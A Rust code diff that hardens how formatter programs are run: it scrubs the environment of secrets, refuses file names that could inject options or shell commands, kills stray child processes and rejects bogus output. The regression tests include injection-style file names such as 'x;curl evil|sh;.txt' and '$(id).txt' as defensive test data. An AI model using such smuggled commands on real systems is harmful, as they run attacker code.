@@ -201,6 +201,116 @@ fn matches_glob(pattern: &str, relative: &str) -> bool {
     }
 }
 
+/// Environment a formatter is given: enough to find its program, its
+/// configuration and a temp directory, and nothing else. The process's own
+/// environment holds provider keys and tokens that a program named in a
+/// repository's settings has no business with.
+const KEPT_ENV: &[&str] = &[
+    "PATH",
+    "HOME",
+    "LANG",
+    "LC_ALL",
+    "LC_CTYPE",
+    "TMPDIR",
+    "XDG_CONFIG_HOME",
+    "XDG_CACHE_HOME",
+    "CARGO_HOME",
+    "RUSTUP_HOME",
+];
+
+/// Whether `relative` may be put in an argument. The name is chosen by the
+/// model, and a formatter is often a wrapper around a shell or a tool that
+/// takes options: a name that begins with `-` is an option, and one with
+/// shell syntax is a command. Anything outside plain path characters is not
+/// passed, so the file is simply written unformatted.
+fn path_is_safe_for_argv(relative: &str) -> bool {
+    !relative.starts_with('-')
+        && relative.split('/').all(|part| !part.starts_with('-'))
+        && relative.chars().all(|c| {
+            c.is_ascii_alphanumeric()
+                || matches!(c, '.' | '_' | '/' | '-' | '+' | '@' | '=' | ',' | ':')
+        })
+}
+
+/// Collects one pipe on a thread, to the end, keeping at most `cap` bytes.
+///
+/// Reading to the end even past the cap keeps the child from blocking on a full
+/// pipe. The buffer is shared, so what has arrived can be taken even if a
+/// grandchild holds the pipe open and the thread never sees the end.
+struct Collected {
+    state: std::sync::Arc<(std::sync::Mutex<CollectedState>, std::sync::Condvar)>,
+}
+
+#[derive(Default)]
+struct CollectedState {
+    bytes: Vec<u8>,
+    overflowed: bool,
+    finished: bool,
+}
+
+impl Collected {
+    fn start(mut pipe: impl Read + Send + 'static, cap: usize) -> Self {
+        let state: std::sync::Arc<(std::sync::Mutex<CollectedState>, std::sync::Condvar)> =
+            std::sync::Arc::default();
+        let shared = std::sync::Arc::clone(&state);
+        std::thread::spawn(move || {
+            let mut chunk = [0u8; 8192];
+            loop {
+                let read = pipe.read(&mut chunk).unwrap_or(0);
+                let (lock, cv) = &*shared;
+                let mut guard = lock
+                    .lock()
+                    .unwrap_or_else(std::sync::PoisonError::into_inner);
+                if read == 0 {
+                    guard.finished = true;
+                    cv.notify_all();
+                    return;
+                }
+                let room = cap.saturating_sub(guard.bytes.len());
+                if read > room {
+                    guard.overflowed = true;
+                }
+                guard.bytes.extend_from_slice(&chunk[..read.min(room)]);
+            }
+        });
+        Self { state }
+    }
+
+    /// What has arrived, after giving the end of the stream `grace` to come.
+    fn take(&self, grace: Duration) -> (Vec<u8>, bool) {
+        let (lock, cv) = &*self.state;
+        let guard = lock
+            .lock()
+            .unwrap_or_else(std::sync::PoisonError::into_inner);
+        let (mut guard, _) = cv
+            .wait_timeout_while(guard, grace, |s| !s.finished)
+            .unwrap_or_else(std::sync::PoisonError::into_inner);
+        (std::mem::take(&mut guard.bytes), guard.overflowed)
+    }
+}
+
+/// End the child and everything it started in its process group.
+fn kill_group(child: &mut std::process::Child) {
+    let pid = child.id();
+    #[cfg(unix)]
+    {
+        let _ = Command::new("kill")
+            .args(["-KILL", "--", &format!("-{pid}")])
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
+            .status();
+    }
+    #[cfg(windows)]
+    {
+        let _ = Command::new("taskkill")
+            .args(["/T", "/F", "/PID", &pid.to_string()])
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
+            .status();
+    }
+    let _ = child.kill();
+}
+
 /// Run `formatter` over `content`, within its timeout.
 fn run(
     formatter: &Formatter,
@@ -208,53 +318,57 @@ fn run(
     relative: &str,
     content: &[u8],
 ) -> Result<Vec<u8>, String> {
+    let uses_path = formatter.command.iter().any(|word| word.contains("{path}"));
+    if uses_path && !path_is_safe_for_argv(relative) {
+        return Err("the file name has characters that are not passed to a formatter".to_owned());
+    }
     let words: Vec<String> = formatter
         .command
         .iter()
         .map(|word| word.replace("{path}", relative))
         .collect();
-    let mut child = Command::new(&words[0])
+    let mut command = Command::new(&words[0]);
+    command
         .args(&words[1..])
         .current_dir(root)
+        .env_clear()
         .stdin(Stdio::piped())
         .stdout(Stdio::piped())
-        .stderr(Stdio::piped())
+        .stderr(Stdio::piped());
+    for key in KEPT_ENV {
+        if let Ok(value) = std::env::var(key) {
+            command.env(key, value);
+        }
+    }
+    for (key, value) in protocol::host_env::platform_base_env() {
+        command.env(key, value);
+    }
+    // Its own process group, so a timeout (or a formatter that leaves a helper
+    // behind) can end everything it started rather than only the direct child.
+    #[cfg(unix)]
+    std::os::unix::process::CommandExt::process_group(&mut command, 0);
+    let mut child = command
         .spawn()
         .map_err(|err| format!("could not start `{}`: {err}", words[0]))?;
-    // Each pipe is serviced on its own thread: a formatter that fills its
-    // output before reading all its input would otherwise stall us for good.
     let input = content.to_vec();
     let mut stdin = child.stdin.take();
-    let writer = std::thread::spawn(move || {
+    std::thread::spawn(move || {
         if let Some(pipe) = stdin.as_mut() {
             let _ = pipe.write_all(&input);
         }
         drop(stdin);
     });
-    let stdout = child.stdout.take();
-    let reader = std::thread::spawn(move || {
-        let mut bytes = Vec::new();
-        if let Some(pipe) = stdout {
-            let _ = pipe
-                .take(MAX_OUTPUT_BYTES as u64 + 1)
-                .read_to_end(&mut bytes);
-        }
-        bytes
-    });
-    let stderr = child.stderr.take();
-    let err_reader = std::thread::spawn(move || {
-        let mut bytes = Vec::new();
-        if let Some(pipe) = stderr {
-            let _ = pipe.take(64 * 1024).read_to_end(&mut bytes);
-        }
-        bytes
-    });
+    let stdout = Collected::start(
+        child.stdout.take().ok_or("no standard output")?,
+        MAX_OUTPUT_BYTES,
+    );
+    let stderr = Collected::start(child.stderr.take().ok_or("no standard error")?, 64 * 1024);
     let deadline = Instant::now() + formatter.timeout;
     let status = loop {
         match child.try_wait() {
             Ok(Some(status)) => break Ok(status),
             Ok(None) if Instant::now() >= deadline => {
-                let _ = child.kill();
+                kill_group(&mut child);
                 let _ = child.wait();
                 break Err(format!(
                     "timed out after {} ms",
@@ -265,10 +379,14 @@ fn run(
             Err(err) => break Err(err.to_string()),
         }
     };
-    let _ = writer.join();
-    let out = reader.join().unwrap_or_default();
-    let err = err_reader.join().unwrap_or_default();
+    // Whatever the formatter left running is not wanted past this point. Its
+    // own output is already in the pipe; a helper holding the pipe open only
+    // delays the end of the stream, which `take` does not wait for long.
+    kill_group(&mut child);
     let status = status?;
+    let grace = Duration::from_millis(300);
+    let (out, overflowed) = stdout.take(grace);
+    let (err, _) = stderr.take(Duration::from_millis(50));
     if !status.success() {
         let text = String::from_utf8_lossy(&err);
         let text = text.trim();
@@ -289,11 +407,22 @@ fn run(
             }
         ));
     }
-    if out.len() > MAX_OUTPUT_BYTES {
+    if overflowed {
         return Err("produced more output than is accepted".to_owned());
     }
+    // A formatter that succeeds is still not trusted to have produced the file:
+    // what it printed may be a usage message, a warning, or another encoding.
     if out.is_empty() && !content.is_empty() {
         return Err("returned nothing for a non-empty file".to_owned());
+    }
+    if std::str::from_utf8(content).is_ok() && std::str::from_utf8(&out).is_err() {
+        return Err("returned text that is not valid UTF-8".to_owned());
+    }
+    if content.len() > 256 && out.len() * 10 < content.len() {
+        return Err(
+            "returned far less text than it was given, which looks like an error message rather than a file"
+                .to_owned(),
+        );
     }
     Ok(out)
 }
@@ -523,5 +652,171 @@ mod tests {
         })
         .expect("note");
         assert!(failed.contains("written as you sent it") && failed.contains("boom"));
+    }
+
+    // --- regressions for the review ----------------------------------------
+
+    #[cfg(unix)]
+    #[test]
+    fn a_helper_left_holding_the_pipe_does_not_hang_the_write() {
+        let formatters = one("cat; sleep 30 &", r#"["*.txt"]"#);
+        let started = Instant::now();
+        let outcome = formatters.format(&root(), "a.txt", b"content\n");
+        assert!(
+            started.elapsed() < Duration::from_secs(5),
+            "took {:?}",
+            started.elapsed()
+        );
+        assert_eq!(
+            outcome,
+            Outcome::Unchanged {
+                by: "sh".to_owned()
+            }
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_timeout_ends_the_helpers_too_and_does_not_wait_for_them() {
+        let (formatters, _) = parse(&format!(
+            r#"{{"formatters":[{{"command":{},"globs":["*.txt"],"timeout_ms":150}}]}}"#,
+            sh("sleep 30 & sleep 30")
+        ));
+        let started = Instant::now();
+        let outcome = formatters.expect("f").format(&root(), "a.txt", b"x");
+        assert!(matches!(outcome, Outcome::Failed { .. }), "{outcome:?}");
+        assert!(
+            started.elapsed() < Duration::from_secs(5),
+            "{:?}",
+            started.elapsed()
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn the_environment_is_scrubbed_down_to_what_a_formatter_needs() {
+        // `cargo test` sets this; it is not in the kept list, so it must not arrive.
+        let formatters = one(r#"printf %s "${CARGO_PKG_NAME-unset}""#, r#"["*.txt"]"#);
+        match formatters.format(&root(), "a.txt", b"x") {
+            Outcome::Formatted { bytes, .. } => assert_eq!(bytes, b"unset"),
+            other => panic!("{other:?}"),
+        }
+        let formatters = one(r#"printf %s "${PATH:+kept}""#, r#"["*.txt"]"#);
+        match formatters.format(&root(), "a.txt", b"x") {
+            Outcome::Formatted { bytes, .. } => assert_eq!(bytes, b"kept", "PATH still arrives"),
+            other => panic!("{other:?}"),
+        }
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_file_name_that_could_be_an_option_or_shell_syntax_is_not_passed_in_an_argument() {
+        let (formatters, _) =
+            parse(r#"{"formatters":[{"command":["sh","-c","cat","fmt","{path}"],"globs":["*"]}]}"#);
+        let formatters = formatters.expect("f");
+        for name in [
+            "--plugin=./x.ts",
+            "sub/-x.txt",
+            "x;curl evil|sh;.txt",
+            "a b.txt",
+            "q`id`.txt",
+            "$(id).txt",
+        ] {
+            match formatters.format(&root(), name, b"x") {
+                Outcome::Failed { reason, .. } => {
+                    assert!(reason.contains("not passed"), "{name}: {reason}")
+                }
+                other => panic!("{name}: {other:?}"),
+            }
+        }
+        assert!(matches!(
+            formatters.format(&root(), "src/ok-name_1.txt", b"x"),
+            Outcome::Unchanged { .. }
+        ));
+        // A command that never mentions the path does not care what it is.
+        let plain = one("cat", r#"["*"]"#);
+        assert!(matches!(
+            plain.format(&root(), "--odd name;.txt", b"x"),
+            Outcome::Unchanged { .. }
+        ));
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn output_that_is_not_the_file_is_refused() {
+        let binary = one(r"printf '\377\376'", r#"["*.txt"]"#);
+        assert!(
+            matches!(binary.format(&root(), "a.txt", b"text"), Outcome::Failed { reason, .. } if reason.contains("UTF-8"))
+        );
+        let big_input = "line of real content\n".repeat(40);
+        let usage = one("echo 'usage: fmt FILE'", r#"["*.txt"]"#);
+        assert!(matches!(
+            usage.format(&root(), "a.txt", big_input.as_bytes()),
+            Outcome::Failed { reason, .. } if reason.contains("error message")
+        ));
+        // A short file may legitimately shrink a lot.
+        assert!(matches!(
+            usage.format(&root(), "a.txt", b"  x  "),
+            Outcome::Formatted { .. }
+        ));
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_noisy_stderr_does_not_turn_a_good_format_into_a_failure() {
+        let formatters = one(
+            "head -c 300000 /dev/zero | tr '\\0' w >&2; cat",
+            r#"["*.txt"]"#,
+        );
+        assert_eq!(
+            formatters.format(&root(), "a.txt", b"fine\n"),
+            Outcome::Unchanged {
+                by: "sh".to_owned()
+            }
+        );
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn a_helper_the_formatter_started_is_ended_with_it() {
+        let dir = std::env::temp_dir().join(format!("rapid-fmt-stray-{}", std::process::id()));
+        std::fs::create_dir_all(&dir).expect("dir");
+        let pidfile = dir.join("pid");
+        let formatters = one(
+            &format!("sleep 60 & echo $! > '{}'; cat", pidfile.display()),
+            r#"["*.txt"]"#,
+        );
+        let outcome = formatters.format(&dir, "a.txt", b"x\n");
+        assert!(matches!(outcome, Outcome::Unchanged { .. }), "{outcome:?}");
+        let pid: u32 = std::fs::read_to_string(&pidfile)
+            .expect("pid written")
+            .trim()
+            .parse()
+            .expect("pid");
+        let alive = |pid: u32| {
+            Command::new("kill")
+                .args(["-0", &pid.to_string()])
+                .stderr(Stdio::null())
+                .status()
+                .is_ok_and(|s| s.success())
+        };
+        let mut gone = false;
+        for _ in 0..100 {
+            if !alive(pid) {
+                gone = true;
+                break;
+            }
+            std::thread::sleep(Duration::from_millis(20));
+        }
+        let _ = std::fs::remove_dir_all(&dir);
+        if !gone {
+            let _ = Command::new("kill")
+                .args(["-KILL", &pid.to_string()])
+                .status();
+        }
+        assert!(
+            gone,
+            "the helper the formatter left behind was still running"
+        );
     }
 }
